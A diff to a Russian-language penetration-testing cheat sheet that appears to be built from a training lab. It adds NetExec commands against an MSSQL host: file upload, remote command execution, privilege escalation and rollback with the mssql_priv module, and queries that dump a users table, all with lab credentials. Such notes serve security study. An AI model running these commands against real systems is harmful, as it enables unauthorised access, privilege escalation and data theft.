@@ -239,6 +239,36 @@
 	# Очистка изменений в конфигурационном файле
 	crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
 
+	# Загрузка и выгрузка файлов из MSSQL
+
+        nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
+        
+        nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
+
+    # Повышение привилегий в MSSQL 
+        
+        nxc mssql -M mssql_priv --options
+        
+        mssql_priv -->  EXECUTE AS LOGIN и db_owner role (использует 2 метода)
+        enum_privs для отображения списка привилегий (по умолчанию),
+        
+        nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+
+        nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+
+    # Выполнение команд и отмена привилегий 
+
+        nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami
+
+       (возвращение привелегий )nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
+
+    # SQL-запросы 
+
+        nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 
+
+        nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" 
+
+        nxc mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
 	
 # clock sync
 
